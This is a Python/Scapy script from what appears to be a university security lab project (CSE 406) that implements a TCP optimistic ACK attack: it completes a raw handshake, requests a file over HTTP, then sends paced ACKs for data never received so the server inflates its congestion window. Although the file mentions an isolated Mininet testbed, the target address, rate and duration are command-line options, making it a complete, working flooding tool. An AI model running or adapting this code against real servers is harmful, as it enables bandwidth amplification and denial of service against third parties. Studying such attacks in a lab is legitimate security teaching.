#!/usr/bin/env python3
"""
optimistic_client.py — TCP Optimistic ACK Generator (runs on h2: 10.0.0.3)
CSE 406: Computer Security Lab Project

Performs a legitimate TCP 3-way handshake and HTTP GET, then injects
paced ACK segments that advance ack_seq by Δ bytes every (1/r) seconds,
tricking the server into inflating its congestion window.

All traffic stays within the isolated Mininet testbed.
"""

import argparse
import logging
import signal
import struct
import sys
import time

from scapy.all import (
    IP, TCP, Raw, send, sr1, sniff, conf, RandShort
)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [OptACK] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("optimistic_client")

# Suppress Scapy's verbose output
conf.verb = 0


class OptimisticACKClient:
    """
    Manages a single TCP connection with user-space ACK injection.

    State variables:
        s0       — server's initial sequence number (from SYN-ACK)
        c0       — client's initial sequence number (our SYN)
        snd_next — next ACK number we will send (tracks our claimed receive pos)
        last_real— highest sequence number we actually received data for
    """

    def __init__(self, server_ip, server_port, src_port, delta, rate, duration):
        self.server_ip = server_ip
        self.server_port = server_port
        self.src_port = src_port
        self.delta = delta              # Δ: bytes to advance per ACK
        self.interval = 1.0 / rate      # inter-ACK spacing in seconds
        self.duration = duration         # total attack duration in seconds

        self.c0 = int(RandShort()) << 16 | int(RandShort())
        self.s0 = None
        self.snd_next = None            # next ack_seq we will claim
        self.last_real = None
        self.running = False

        self.stats = {
            "acks_sent": 0,
            "bytes_claimed": 0,
            "data_pkts_received": 0,
        }

    # ------------------------------------------------------------------
    # TCP Handshake
    # ------------------------------------------------------------------
    def handshake(self):
        """Perform the 3-way TCP handshake."""
        log.info("Starting 3-way handshake to %s:%d", self.server_ip, self.server_port)

        # SYN
        syn = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.c0, flags="S",
                  options=[("MSS", 1460), ("WScale", 7)])
        )
        syn_ack = sr1(syn, timeout=5)
        if syn_ack is None or not syn_ack.haslayer(TCP):
            log.error("No SYN-ACK received — is the server running?")
            sys.exit(1)
        if syn_ack[TCP].flags != 0x12:  # SYN+ACK
            log.error("Unexpected flags: 0x%02x", syn_ack[TCP].flags)
            sys.exit(1)

        self.s0 = syn_ack[TCP].seq
        self.snd_next = self.s0 + 1   # ACK the SYN-ACK (1 byte for SYN)
        self.last_real = self.snd_next

        # ACK (completes handshake)
        ack = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.c0 + 1, ack=self.snd_next,
                  flags="A", window=65535)
        )
        send(ack)
        log.info("Handshake complete — server ISN=%d, client ISN=%d", self.s0, self.c0)

    # ------------------------------------------------------------------
    # HTTP GET request
    # ------------------------------------------------------------------
    def send_get(self, path="/video.mp4"):
        """Send an HTTP GET to trigger the server's data stream."""
        http_req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.server_ip}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        pkt = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.c0 + 1, ack=self.snd_next,
                  flags="PA", window=65535)
            / Raw(load=http_req.encode())
        )
        send(pkt)
        log.info("Sent HTTP GET %s", path)

    # ------------------------------------------------------------------
    # Optimistic ACK injection loop
    # ------------------------------------------------------------------
    def inject_acks(self):
        """
        Main attack loop: pace ACK segments that advance ack_seq by Δ bytes
        every (1/r) seconds, claiming to have received data we haven't.
        """
        self.running = True
        start_time = time.monotonic()
        log.info("Starting optimistic ACK injection: Δ=%d B, interval=%.3f s, "
                 "duration=%d s", self.delta, self.interval, self.duration)

        client_seq = self.c0 + 1  # after SYN + GET payload (simplified)

        while self.running:
            elapsed = time.monotonic() - start_time
            if elapsed >= self.duration:
                break

            # Advance the claimed ACK number by Δ
            self.snd_next += self.delta
            self.stats["bytes_claimed"] += self.delta

            ack_pkt = (
                IP(dst=self.server_ip)
                / TCP(sport=self.src_port, dport=self.server_port,
                      seq=client_seq, ack=self.snd_next,
                      flags="A", window=65535)
            )
            send(ack_pkt)
            self.stats["acks_sent"] += 1

            if self.stats["acks_sent"] % 100 == 0:
                log.info("ACKs sent: %d | claimed offset: +%d B | elapsed: %.1fs",
                         self.stats["acks_sent"], self.stats["bytes_claimed"], elapsed)

            time.sleep(self.interval)

        self.running = False
        self._print_summary(time.monotonic() - start_time)

    def _print_summary(self, total_time):
        log.info("=== Injection Summary ===")
        log.info("Duration:       %.1f s", total_time)
        log.info("ACKs sent:      %d", self.stats["acks_sent"])
        log.info("Bytes claimed:  %d (%.2f MB)",
                 self.stats["bytes_claimed"],
                 self.stats["bytes_claimed"] / 1e6)
        log.info("Effective rate: %.2f ACKs/s",
                 self.stats["acks_sent"] / max(total_time, 0.001))

    # ------------------------------------------------------------------
    # Teardown
    # ------------------------------------------------------------------
    def teardown(self):
        """Send FIN to close the connection gracefully."""
        fin = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.c0 + 1, ack=self.snd_next,
                  flags="FA", window=65535)
        )
        send(fin)
        log.info("FIN sent — connection teardown initiated")

    def stop(self):
        self.running = False


def main():
    parser = argparse.ArgumentParser(
        description="TCP Optimistic ACK generator for CSE 406 lab"
    )
    parser.add_argument("--server", default="10.0.0.1",
                        help="Target server IP (default: 10.0.0.1)")
    parser.add_argument("--port", type=int, default=80,
                        help="Target server port (default: 80)")
    parser.add_argument("--sport", type=int, default=44444,
                        help="Source port (default: 44444)")
    parser.add_argument("--delta", type=int, default=14600,
                        help="Bytes to advance per ACK (default: 14600 = 10 MSS)")
    parser.add_argument("--rate", type=float, default=200.0,
                        help="ACK injection rate in ACKs/sec (default: 200)")
    parser.add_argument("--duration", type=int, default=60,
                        help="Attack duration in seconds (default: 60)")
    args = parser.parse_args()

    client = OptimisticACKClient(
        server_ip=args.server,
        server_port=args.port,
        src_port=args.sport,
        delta=args.delta,
        rate=args.rate,
        duration=args.duration,
    )

    def sigint_handler(sig, frame):
        log.info("SIGINT received — stopping injection")
        client.stop()

    signal.signal(signal.SIGINT, sigint_handler)

    client.handshake()
    time.sleep(0.5)
    client.send_get()
    time.sleep(1.0)
    client.inject_acks()
    client.teardown()


if __name__ == "__main__":
    main()
